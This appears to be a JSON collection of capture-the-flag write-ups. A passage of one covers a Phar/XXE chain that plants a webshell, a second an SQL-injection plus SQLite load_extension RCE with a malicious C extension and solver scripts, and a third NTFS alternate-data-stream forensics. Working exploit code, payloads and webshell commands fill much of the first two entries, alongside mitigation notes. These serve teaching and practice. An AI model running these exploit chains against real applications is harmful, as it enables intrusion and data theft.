      "content": "Complete Python automation script that orchestrates the entire exploitation chain:\n1. Generate and compile Phar payload using create_phar.php\n2. Upload malicious Phar as GIF image\n3. Extract upload path from server response\n4. Craft and submit XXE payload with phar:// reference\n5. Execute arbitrary commands through webshell\n\nUsage: python3 solve.py [optional_command]",
      "code": "import re\nimport subprocess\nimport sys\nimport requests\nimport urllib3\n\nurllib3.disable_warnings()\ns = requests.Session()\ns.verify = False\n\nBASE_URL = \"https://9f12ade61851e040.247ctf.com\"\n\nXML_PAYLOAD = \"\"\"\\\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"phar://{path}\"> %xxe;]>\n<message>\n  <to>a</to>\n  <from>b</from>\n  <image>c</image>\n</message>\n\"\"\"\n\ndef main():\n    if len(sys.argv) != 2:\n        print(\"[*] Stage 1: Creating Phar payload...\")\n        # Bypass phar.readonly restriction in CLI\n        p = subprocess.run([\"php\", \"-d\", \"phar.readonly=0\", \"create_phar.php\"], capture_output=True, check=True)\n        phar = p.stdout\n        assert len(phar) <= 185, f\"Phar size {len(phar)} exceeds 185 bytes\"\n        print(f\"[+] Phar payload created ({len(phar)} bytes)\")\n        \n        print(\"[*] Stage 2: Uploading malicious Phar as GIF...\")\n        # Upload phar\n        r = s.post(BASE_URL, files={\"image\": (\"test.gif\", phar, \"image/gif\")})\n        m = re.findall(r\"Image uploaded (.*?)!\", r.text)\n        assert m, \"Failed to upload image\"\n        image_path = m[0]\n        print(f\"[+] Phar uploaded to: {image_path}\")\n        \n        print(\"[*] Stage 3: Triggering XXE deserialization...\")\n        # Trigger XXE\n        r = s.post(BASE_URL, data={\"message\": XML_PAYLOAD.format(path=image_path)})\n        assert \"Message stored\" in r.text, \"Failed to upload XML\"\n        print(\"[+] Webshell successfully planted at a.php\")\n    else:\n        cmd = sys.argv[1]\n        print(f\"[*] Executing command: {cmd}\\n\")\n        r = s.get(f\"{BASE_URL}/a.php\", params={\"0\": cmd})\n        m = re.findall(r\"Hey (.*)! Take\", r.text, re.MULTILINE | re.DOTALL)\n        if m:\n            print(\"[+] Output Result:\\n\")\n            print(m[0].strip())\n        else:\n            print(\"[!] No output captured\")\n\nif __name__ == \"__main__\":\n    main()"
    }
  ],
  "terminalOutputs": [
    {
      "command": "python3 solve.py ls",
      "output": "[*] Mengeksekusi perintah: ls\n\n[+] Hasil Output:\n\na.php\nindex.html\nindex.php\nvalid_message.xsd"
    },
    {
      "command": "python3 solve.py 'ls -la /'",
      "output": "[*] Mengeksekusi perintah: ls -la /\n\n[+] Hasil Output:\n\ntotal 0\ndrwxr-xr-x   1 root   root      39 Feb 23 19:43 .\ndrwxr-xr-x   1 root   root      39 Feb 23 19:43 ..\n-rwxr-xr-x   1 root   root       0 Feb 23 19:43 .dockerenv\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 bin\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 boot\ndrwxr-xr-x   1 root   root       0 Dec 26  2018 cgroup\ndr-xr-xr-x   1 root   root       0 Dec 26  2018 cgroup2\ndrwxr-xr-x   5 root   root     360 Feb 23 19:42 dev\ndrwxr-xr-x   1 root   root      66 Feb 23 19:42 etc\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 home\ndrwxr-xr-x   1 root   root      13 Dec 29  2018 lib\ndrwxr-xr-x   2 root   root      37 Dec 29  2018 lib64\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 media\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 mnt\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 opt\ndr-xr-xr-x 117 root   root       0 Dec 26  2018 proc\ndr-xr-x---   2 root   root     160 Feb 23 19:42 root\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 run\ndrwxr-xr-x   1 root   root      32 Dec 29  2018 sbin\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 srv\ndr-xr-xr-x  13 root   root       0 Dec 26  2018 sys\ndrwxrwxrwt   1 root   root      36 Feb 23 19:48 tmp\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 usr\ndrwxr-xr-x   1 root   root      17 Dec 29  2018 var"
    },
    {
      "command": "python3 solve.py \"find / -name '*flag*' 2>/dev/null | grep -E '(^[^/proc]|flag_)'\"",
      "output": "[*] Mengeksekusi perintah: find / -name '*flag*' 2>/dev/null\n\n[+] Hasil Output:\n\n/tmp/flag_0073c38db2a4d3c1.txt"
    },
    {
      "command": "python3 solve.py \"cat /tmp/flag_0073c38db2a4d3c1.txt\"",
      "output": "[*] Mengeksekusi perintah: cat /tmp/flag_0073c38db2a4d3c1.txt\n\n[+] Hasil Output:\n\n247CTF{0073c38db2a4d3c1209caa84ccc5668f}"
    }
  ],
  "flag": "247CTF{0073c38db2a4d3c1209caa84ccc5668f}",
  "lessonsLearned": "**File Upload Validation** - File upload validation must use multiple independent checks - magic bytes alone are insufficient. Always use whitelist MIME types, disable PHP execution in upload directories, and validate file content properly.\n\n**XML Security** - Never enable LIBXML_DTDLOAD flag unless absolutely necessary. XXE vulnerabilities are critical in XML processing with potentially catastrophic impact.\n\n**Deserialization Gadgets** - PHP magic methods (__destruct, __wakeup, __toString) combined with user-controllable object properties create dangerous deserialization gadget chains. Audit all classes with magic methods for exploitation potential.\n\n**Stream Wrappers** - Phar archives with stream wrappers (phar://) automatically trigger deserialization. Treat php:// and phar:// URI schemes as code execution vectors and restrict their use.\n\n**Payload Optimization** - Size-limited payloads can be optimized through algorithm selection (MD5 vs SHA256 signatures) and tight code golf. Always account for creative constraints when building exploits.\n\n**Defense in Depth** - Multi-layer exploitation chains are more likely to bypass defense in depth. Defensive measures must address all layers simultaneously, not just individual components.\n\n**Exposure Prevention** - Command execution endpoints should never be exposed. The webshell a.php demonstrates that even small successful writes lead to complete system compromise."

},
{
  "id": "11",
  "title": "Subscriber",
  "category": "Web",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-24",
  "author": "nata",
  "ctfName": "FlagYard",
  "description": "SQLite extension loading RCE vulnerability. Exploit SQL Injection combined with unrestricted file uploads and SQLite load_extension() to achieve remote code execution.",
  "problemDescription": "A Flask application integrated with SQLite database configured with enable_load_extension(True). The /subscribe endpoint is vulnerable to SQL Injection through the updates_freq parameter. The /feedback endpoint allows file uploads with weak validation. The challenge is to combine both vulnerabilities to achieve RCE and read the flag from the system.",
  "tools": [
    "Python",
    "GCC",
    "SQLite",
    "SQL Injection",
    "Requests"
  ],
  "analysis": "Vulnerability analysis reveals three critical components enabling RCE:\n\n1. **SQL Injection in /subscribe**: The updates_freq parameter uses f-string interpolation without sanitization, allowing arbitrary SQL command injection.\n\n2. **Unrestricted File Upload**: The filter_filename function only checks file extension at the end of the filename with no magic bytes validation. A .so (shared object) file can be uploaded with name shell.jpg and stored in ./uploads/ directory.\n\n3. **SQLite load_extension()**: Database configuration with enable_load_extension(True) allows loading custom shared libraries. When load_extension('path/to/shell.so') is called, C code in the library executes with Flask process privilege.\n\n**Vulnerability Chain**: C extension payload runs automatically during loading (initialization phase). Since Flask is stateless, we leverage this to execute system commands (system()) redirecting output to an accessible file.",
  "solution": [
    {
      "title": "Executive Summary",
      "content": "Subscriber is an advanced web challenge simulating security failures in SQLite database integration with Flask. The vulnerability originates from simple SQL Injection which escalates to Remote Code Execution (RCE) through SQLite extension loading feature. Attackers exploit file validation gaps to upload malicious C libraries (shared objects)."
    },
    {
      "title": "Reconnaissance",
      "content": "The application has several functional endpoints:\n\n- `/`: Home page\n\n- `/subscribe`: Email subscription form using the `updates_freq` parameter\n- `/feedback`: Feedback submission form allowing file uploads\n\n**Database Identification**\n\nThrough error-based and boolean-based probing, the application uses SQLite. The critical finding is the database configuration explicitly allowing extension loading.\n\nDatabase configuration allows extension loading:\n\n```\n================ VULNERABLE CONFIG ================\nconn.enable_load_extension(True)\n================================================\n```\n\n**SQL Injection (Blind Boolean)**\n\nThe `updates_freq` parameter on `/subscribe` endpoint is vulnerable to SQL Injection due to f-string interpolation without sanitization:\n\n```\n================ VULNERABLE QUERY ================\ncursor.execute(f\"SELECT freq FROM updates_freq WHERE option = '{update_option}'\")\n================================================\n```\n\nBasic payload: `' OR 1=1 -- -`"
    },
    {
      "title": "Vulnerability Analysis - Unrestricted File Upload",
      "content": "**Vulnerability #1: Unrestricted File Upload (Extension Bypass)**\n\nThe filter_filename function only checks file extension at the filename end without validating actual content (magic bytes). An attacker can upload a .so (C library) file named shell.jpg, and the application stores it in the ./uploads/ directory."
    },
    {
      "title": "Vulnerability Analysis - SQLite Extension Loading RCE",
      "content": "**Vulnerability #2: SQLite Extension Loading RCE**\n\nThe load_extension() function in SQLite allows loading custom shared libraries. If an attacker can direct this function to an uploaded .so file, the C code inside the library executes with the same privileges as the web application."
    },
    {
      "title": "Exploitation - Malicious C Extension",
      "content": "**Step 1: Creating Malicious SQLite Extension**\n\nCreate a SQLite extension that executes system commands immediately when the library is loaded (initialization phase). This is crucial because Flask is stateless—database connections close after each request.",
      "code": "#include <sqlite3ext.h>\n#include <stdlib.h>\n\nSQLITE_EXTENSION_INIT1\n\nint sqlite3_extension_init(sqlite3 *db, char **pzErrMsg,\n                          const sqlite3_api_routines *pApi) {\n    SQLITE_EXTENSION_INIT2(pApi);\n    \n    // Payload executes automatically when load_extension() is called\n    system(\"cat /app/flag.txt > ./uploads/out.txt\");\n    \n    return SQLITE_OK;\n}\n\n// Compile with: gcc -shared -fPIC -o shell.so shell.c -lsqlite3"
    },
    {
      "title": "Exploitation - Python Solver",
      "content": "**Step 2: Exploit Automation Script**\n\nThis script uploads the payload and triggers execution through SQL Injection in a single workflow.",
      "code": "import requests\nimport time\n\nbase_url = \"http://ukjmwexhynntzwdgyxvsda-0.playat.flagyard.com\"\n\n# 1. Upload malicious extension\nwith open('shell.so', 'rb') as f:\n    requests.post(f\"{base_url}/feedback\", \n                 data={'title': 'Exploit', 'description': 'RCE'}, \n                 files={'file': ('shell.jpg', f, 'application/octet-stream')})\n\n# 2. Trigger RCE via SQL Injection\npayload = \"0' AND load_extension('./uploads/shell.jpg') -- -\"\nrequests.post(f\"{base_url}/subscribe\", \n             data={'email': 'a@b.com', 'updates_freq': payload})\n\n# 3. Read command output\ntime.sleep(1)\nprint(requests.get(f\"{base_url}/uploads/out.txt\").text)"
    },
    {
      "title": "Terminal - Step 1: Directory Exploration",
      "content": "**Step 1: Explore Root Directory** (`ls -la /`)\n\nInitial command to map the system structure.",
      "code": "================ OUTPUT BASH ================\ntotal 76\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 .\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 ..\ndrwxr-xr-x   1   1000    1000 4096 Feb 23 20:34 app\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 bin -> usr/bin\n...\ndrwxr-xr-x  12 nobody nogroup 4096 Sep 26  2024 usr\ndrwxr-xr-x  11 nobody nogroup 4096 Sep 26  2024 var\n=============================================="
    },
    {
      "title": "Terminal - Step 2: Locate Flag File",
      "content": "**Step 2: Search Application Directory** (`ls -R /app`)\n\nLocate the actual flag file.",
      "code": "================ OUTPUT BASH ================\n/app:\napp.py\nconfig.py\nflag.txt  <-- FLAG FOUND!\ninstance\nrun\nsite.db\nstatic\ntemplates\nuploads\n=============================================="
    },
    {
      "title": "Terminal - Step 3: Extract Flag",
      "content": "**Step 3: Read Flag File** (`cat /app/flag.txt`)\n\nExtract the flag content.",
      "code": "nata@rblx-labs ~/ctf/flagyard/web/13 % python3 solve.py\n[+] Phase 1: Uploading malicious extension...\n[+] Phase 2: Loading extension & Triggering Execution...\n[+] Phase 3: Retrieving output from /uploads/out.txt...\n\n================ OUTPUT BASH ================\nFlagY{d65441712f1d145acbad77b9d78c87be}\n=============================================="
    },
    {
      "title": "Conclusion & Mitigation",
      "content": "The attack succeeds due to a combination of:\n\n**1. Insecure SQL Usage**\n\nNever use string interpolation in SQL queries. Always use parameterized queries with placeholders:\n\n```\n================ SECURE QUERY ================\ncursor.execute(\"SELECT freq FROM updates_freq WHERE option = ?\", (update_option,))\n================================================\n```\n\n**2. Database Misconfiguration**\n\nDo not enable load_extension in production. Keep extension loading disabled and restrict only to trusted administrators in controlled environments:\n\n```\n================ SECURE CONFIG ================\nconn.enable_load_extension(False)  # Default behavior\n================================================\n```\n\n**3. Weak File Validation**\n\nDo not rely solely on filename extensions. Implement multiple validation layers:\n- Validate magic bytes (file signatures)\n- Use whitelist MIME types\n- Disable script execution in upload directories (/uploads/.htaccess)\n- Rename uploaded files with random strings",
      "code": "# Secure file upload validation\nimport mimetypes\nimport os\nfrom pathlib import Path\n\nALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}\nALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif'}\n\ndef validate_upload(file):\n    # 1. Check extension\n    _, ext = os.path.splitext(file.filename)\n    if ext.lower()[1:] not in ALLOWED_EXTENSIONS:\n        raise ValueError(\"Invalid file extension\")\n    \n    # 2. Check MIME type\n    mime, _ = mimetypes.guess_type(file.filename)\n    if mime not in ALLOWED_MIMES:\n        raise ValueError(\"Invalid MIME type\")\n    \n    # 3. Check magic bytes\n    import magic\n    file_type = magic.from_buffer(file.read(1024), mime=True)\n    file.seek(0)  # Reset file pointer\n    if file_type not in ALLOWED_MIMES:\n        raise ValueError(\"Magic bytes do not match expected format\")\n    \n    return True"
    }
  ],
  "terminalOutputs": [
    {
      "command": "ls -la /",
      "output": "total 76\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 .\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 ..\ndrwxr-xr-x   1   1000    1000 4096 Feb 23 20:34 app\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 bin -> usr/bin\ndrwxr-xr-x   2 nobody nogroup 4096 Sep 26  2024 boot\ndrwxr-xr-x   5 nobody nogroup 4096 Feb 23 19:42 dev\ndrwxr-xr-x   1 nobody nogroup   66 Feb 23 19:42 etc\ndrwxr-xr-x   1 nobody nogroup   19 Dec 26  2018 home\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 lib -> usr/lib\nlrwxrwxrwx   1 nobody nogroup    9 Sep 26  2024 lib64 -> usr/lib64\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 media\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 mnt\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 opt\ndr-xr-xr-x 117 root   root       0 Dec 26  2018 proc\ndr-xr-x---   2 root   root     160 Feb 23 19:42 root\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 run\ndrwxr-xr-x   1 root   root      32 Dec 29  2018 sbin\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 srv\ndr-xr-xr-x  13 root   root       0 Dec 26  2018 sys\ndrwxrwxrwt   1 root   root      36 Feb 23 19:48 tmp\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 usr\ndrwxr-xr-x   1 root   root      17 Dec 29  2018 var"
    },
    {
      "command": "ls -R /app",
      "output": "/app:\napp.py\nconfig.py\nflag.txt\ninstance\nrun\nsite.db\nstatic\ntemplates\nuploads"
    },
    {
      "command": "python3 solve.py",
      "output": "[+] Phase 1: Uploading malicious extension...\n[+] Phase 2: Loading extension & Triggering Execution...\n[+] Phase 3: Retrieving output from /uploads/out.txt...\n\nFlagY{d65441712f1d145acbad77b9d78c87be}"
    }
  ],
  "flag": "FlagY{d65441712f1d145acbad77b9d78c87be}",
  "lessonsLearned": "**SQL Injection Prevention** - Never use string interpolation in SQL queries. Always use prepared statements with parameter binding to prevent SQL Injection attacks. Treated untrusted input as data, not code.\n\n**Database Extension Security** - Database extension features like load_extension() must be disabled in production environments. Restrict extension loading only to trusted administrators in controlled environments with proper auditing.\n\n**File Upload Validation** - File upload validation must not depend on a single defense layer. Implement multiple validation layers: extension whitelist, magic bytes verification, MIME type checking, and disable script execution in upload directories with proper server configuration.\n\n**Principle of Least Privilege** - Enable only the functionality required and disable everything unnecessary. SQLite enable_load_extension should be disabled by default in production deployments. Review all enabled features regularly.\n\n**Stateless Application Design** - Even though Flask is stateless, side effects from library loading can persist through the file system. Audit all initialization code in loaded extensions for unintended consequences and security implications.\n\n**Defense in Depth** - Multiple individually minor vulnerabilities can combine to create critical RCE. Secure development requires comprehensive security testing across all components and threat modeling of vulnerability chains."

}, {
  "id": "12",
  "title": "Zippy",
  "category": "Forensics",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-02-24",
  "author": "nata",
  "ctfName": "Vulnby CTF",
  "description": "A forensic challenge leveraging NTFS Alternate Data Streams (ADS) as a hiding mechanism for archive passwords. The challenge combines archive cryptography (AES-256), file format analysis, and cross-OS filesystem limitations.",
  "problemDescription": "Challenge riddle: 'How much data is lost during compression? Dont keep the lock and key at the same place'. Two encrypted archive files are provided: locked_files.zip (AES-256 encrypted) and locked_files.rar (RAR5 format). The password for the ZIP archive is intentionally hidden in a Windows NTFS Alternate Data Stream (ADS) within the RAR file, creating a cross-OS filesystem challenge when working on Linux systems.",
  "tools": [
    "7z (p7zip-rar plugin)",
    "RAR5 format",
    "NTFS Alternate Data Streams",
    "Linux Ext4",
    "AES-256 encryption",
    "Archive analysis",
    "Hex dump utilities"
  ],
  "analysis": "The challenge presents a sophisticated use of Windows NTFS Alternate Data Streams (ADS) to hide sensitive data:\n\n**Understanding Alternate Data Streams (ADS)**\n\nNTFS Alternate Data Streams are a feature of the Windows NTFS filesystem that allow files to have multiple data streams attached to them. This is leveraged for metadata (e.g., file icons, zone information), but can also be exploited to hide data:\n\n```\nMain Stream: locked_files.zip (203 bytes) - the actual encrypted ZIP file\nADS Stream: locked_files.zip:forgotpassword (32 bytes) - password hidden in stream\n```\n\n**The Trap: OS Limitations**\n\nLinux filesystems (Ext4) do not natively support NTFS Alternate Data Streams. When the RAR file is extracted on Linux using standard tools (unrar, 7z without proper configuration), the extractor attempts to read the ADS but fails with:\n\n```\nERROR: Unsupported Method : locked_files.zip:forgotpassword\n```\n\nThis forces solver analysis of the riddle 'how much data is lost during compression' leading down false paths involving bruteforce attacks, Known-Plaintext Attack (KPA), or theoretical compression ratio analysis instead of the actual solution.\n\n**Critical Observation for Success**\n\nUsing `7z l locked_files.rar` (list without extracting), the ADS is revealed in the file listing:\n\n```\nAlternate Streams: 1\nAlternate Streams Size: 32\n```\n\nThis critical hint indicates data exists beyond the visible file. The challenge requires recognizing this signature and using 7z with proper RAR5 support to extract the stream despite Linux filesystem limitations.",
  "solution": [
    {
      "title": "Phase 1: Reconnaissance & Discovery",
      "content": "**Initial Analysis**\n\nStart by examining both provided files to understand their structure and encryption:\n\n```bash\n# Check ZIP file contents and encryption\n7z l locked_files.zip\nType = zip\nPhysical Size = 203 bytes\nFile: flag.txt (37 bytes) - AES-256 encrypted\n\n# Check RAR file contents\n7z l locked_files.rar\nType = Rar5\nPath = locked_files.zip (203 bytes - compressed: 194 bytes)\nAlternate Streams: 1\nAlternate Streams Size: 32 bytes\n```\n\n**Critical Finding**: The presence of 'Alternate Streams: 1' with a 32-byte size is the key indicator. This anomaly doesn't appear in standard file managers and requires specialized archive tools to detect.\n\n**Riddle Analysis**\n\nInitial interpretation of 'How much data is lost during compression?' leads to false assumptions about compression ratios or data loss calculations. The real meaning becomes clear after discovering the ADS: data loss refers to losing track of hidden streams when using incompatible extraction tools on different operating systems."
    },
    {
      "title": "Phase 2: The Trap (False Path)",
      "content": "**Common Mistakes**\n\nAfter discovering the ADS stream name `:forgotpassword`, solvers naturally assume it contains the password. However, attempting to extract it using standard Linux tools fails:\n\n```bash\n# Attempt 1: Using unrar\nunrar x locked_files.rar\nERROR: Unsupported Method : locked_files.zip:forgotpassword\n\n# Attempt 2: Using basic 7z\n7z x locked_files.rar\nReturns 0-byte placeholder file instead of actual stream content\n```\n\n**Bruteforce Rabbit Hole**\n\nFailing to extract the stream leads to hypothesis that 'forgotpassword' is itself a password hint. Solvers attempt:\n- MD5 hash of 'forgotpassword'\n- Variations and permutations\n- Dictionary-based attacks\n- Logic-based guessing from metadata\n\nAll attempts fail with: `ERROR: Wrong password : flag.txt`\n\n**Why Standard Tools Fail**\n\nLinux Ext4 filesystem has no concept of alternate data streams. When tools encounter a stream in RAR metadata:\n- Some tools ignore the stream entirely\n- Some create empty files\n- Some throw unsupported format errors\n\nThe solution requires tools with explicit RAR5 support *and* the ability to forcefully extract all data despite OS limitations."
    },
    {
      "title": "Phase 3: Breaking Through OS Limitations",
      "content": "**The p7zip-rar Plugin**\n\nThe key is using 7z with the p7zip-rar plugin, which provides full RAR5 format support. This tool can extract ADS metadata even though the Linux filesystem cannot natively store streams:\n\n```bash\n# Install p7zip-rar for RAR5 support\nsudo apt-get install p7zip-rar\n\n# Extract with interactive prompt (forces full extraction)\n7z x locked_files.rar\n\nWould you like to replace the existing file:\n  Path: ./locked_files.zip\nwith the file from archive?\n? (Y)es / (N)o / (A)lways / (S)kip all / (Q)uit? y\n\n# Critical output\nAlternate Streams: 1\nAlternate Streams Size: 32\n```\n\n**Extracting the Hidden Stream**\n\nOnce extracted, the ADS content can be read using cat with the ADS path notation:\n\n```bash\ncat \"locked_files.zip:forgotpassword\"\n8d364896e034aabe3fc9fd2e05fb1cbe\n```\n\nThis is the MD5 hash of the password, which serves as the password for the AES-256 encrypted ZIP file!"
    },
    {
      "title": "Phase 4: Final Exploitation",
      "content": "**Decrypting the ZIP Archive**\n\nWith the password extracted from the hidden ADS stream, decrypt and extract the actual flag:\n\n```bash\n7z x locked_files.zip -p8d364896e034aabe3fc9fd2e05fb1cbe\n\n7-Zip 23.01 (x64)\nPath = locked_files.zip\nType = zip\n\nWould you like to replace the existing file:\n  Path: ./flag.txt\n  Size: 0 bytes\nwith the file from archive:\n  Path: flag.txt\n  Size: 37 bytes\n? (Y)es / (N)o / (A)lways / (S)kip all / (Q)uit? y\n\nEverything is Ok\nSize: 37\nCompressed: 203\n```\n\n**Reading the Flag**\n\n```bash\ncat flag.txt\nVBD{c99a11a53a3748269e3f86d7ac38df11}\n```"
    },
    {
      "title": "Technical Deep Dive: NTFS ADS Exploitation",
      "content": "**Why ADS for Hiding Data?**\n\nADS exploitation is particularly effective because:\n1. Hidden by default in Windows Explorer\n2. Not visible in standard file listings\n3. Survive file copies on NTFS systems (but lost on non-NTFS)\n4. Difficult to detect without specialized tools\n\n**ADS in RAR Format**\n\nRAR5 format explicitly preserves NTFS metadata including ADS:\n- RAR5 headers store ADS information\n- File size discrepancies become visible when analyzing archive structure\n- 7z reports 'Alternate Streams' in detailed listing\n\n**Cross-OS Filesystem Compatibility**\n\n```\nNTFS (Windows): Stores ADS natively - transparent access\nExt4 (Linux): No ADS support\n  ├─ Can extract ADS metadata from RAR\n  ├─ Cannot store ADS on Ext4 filesystem\n  ├─ Tools must handle data differently (shell redirection, special paths)\n  └─ Name collision avoidance using colon notation\n```\n\n**7z ADS Handling**\n\n7z preserves ADS through special notation:\n- Stores extracted ADS files with colon in filename\n- Filesystem access via `cat filename:streamname` (shell interprets colon)\n- Creates no separate file entries on Ext4"
    }
  ],
  "terminalOutputs": [
    {
      "command": "7z l locked_files.rar",
      "output": "7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20\n 64-bit locale=C.UTF-8 Threads:12 OPEN_MAX:10240\n\nScanning the drive for archives:\n1 file, 357 bytes (1 KiB)\n\nPath = locked_files.rar\nType = Rar5\n   Date      Time    Attr         Size   Compressed  Name\n------------------- ----- ------------ ------------  ------------------------\n2026-02-24 22:52:38 ....A          203          194  locked_files.zip\n------------------- ----- ------------ ------------  ------------------------\n2026-02-24 22:52:38                203          194  1 files\n2026-02-24 22:52:38                 32           39  1 alternate streams\n2026-02-24 22:52:38                235          233  2 streams"
    },
    {
      "command": "7z x locked_files.rar",
      "output": "7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20\n 64-bit locale=C.UTF-8 Threads:12 OPEN_MAX:10240\n\nScanning the drive for archives:\n1 file, 357 bytes (1 KiB)\n\nExtracting archive: locked_files.rar\n--\nPath = locked_files.rar\nType = Rar5\nPhysical Size = 357\nSolid = -\nBlocks = 2\nEncrypted = -\nMultivolume = -\nVolumes = 1\n\nWould you like to replace the existing file:\n  Path:     ./locked_files.zip\n  Size:     203 bytes (1 KiB)\n  Modified: 2026-02-24 22:52:38\nwith the file from archive:\n  Path:     locked_files.zip\n  Size:     203 bytes (1 KiB)\n  Modified: 2026-02-24 22:52:38\n? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y\n\nEverything is Ok\n\nFiles: 1\nAlternate Streams: 1\nAlternate Streams Size: 32\nSize:       203\nCompressed: 357"
    },
    {
      "command": "cat \"locked_files.zip:forgotpassword\"",
      "output": "8d364896e034aabe3fc9fd2e05fb1cbe"
    },
    {
      "command": "7z x locked_files.zip -p8d364896e034aabe3fc9fd2e05fb1cbe",
      "output": "7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20\n 64-bit locale=C.UTF-8 Threads:12 OPEN_MAX:10240\n\nScanning the drive for archives:\n1 file, 203 bytes (1 KiB)\n\nExtracting archive: locked_files.zip\n--\nPath = locked_files.zip\nType = zip\nPhysical Size = 203\n\nWould you like to replace the existing file:\n  Path:     ./flag.txt\n  Size:     0 bytes\n  Modified: 2026-02-24 20:52:38\nwith the file from archive:\n  Path:     flag.txt\n  Size:     37 bytes (1 KiB)\n  Modified: 2026-02-24 20:52:38\n? (Y)es / (N)o / (N)o to All / (Y)es to All / Auto Rename / (Q)uit? y\n\nEverything is Ok\n\nSize:       37\nCompressed: 203"
    },
    {
      "command": "cat flag.txt",
      "output": "VBD{c99a11a53a3748269e3f86d7ac38df11}"
    }
  ],
  "flag": "VBD{c99a11a53a3748269e3f86d7ac38df11}",
  "lessonsLearned": "**NTFS Alternate Data Streams as a Security Concern** - While ADS are useful for metadata, they represent a significant security risk when not properly understood. Data can be hidden in plain sight without triggering standard file analysis tools. Always examine archive metadata closely, especially size discrepancies and tool-specific information fields.\n\n**Cross-OS Filesystem Compatibility** - File formats and filesystem features do not translate across operating systems. Archives created on Windows with NTFS-specific metadata may behave unexpectedly on Linux systems. Understanding these limitations is crucial for forensic analysis and incident response.\n\n**Archive Tool Capabilities Matter** - Not all archive extraction tools are equal. Standard unrar may fail where 7z with p7zip-rar succeeds. Always verify your tools support the specific archive format VERSION and include native metadata handling. The choice of tool can be the difference between finding evidence and missing it.\n\n**Riddle Misdirection** - CTF riddles often point to the vulnerability category but can misdirect the approach. 'How much data is lost' initially suggests compression analysis rather than hidden data discovery. Critical thinking about multiple interpretations of hints is necessary.\n\n**Metadata Analysis** - The 'Alternate Streams: 1' field in 7z output was the breakthrough indicator. Forensic analysis requires attention to every detail of tool output, including fields that may seem unimportant at first glance. Extract and examine all metadata.\n\n**Defense in Depth for Data Protection** - The challenge combines multiple security layers: archive encryption (AES-256), password isolation (ADS), format complexity (RAR5), and OS-level hiding. While this creates challenge difficulty, it demonstrates why strong data protection requires multiple mechanisms working together."
}];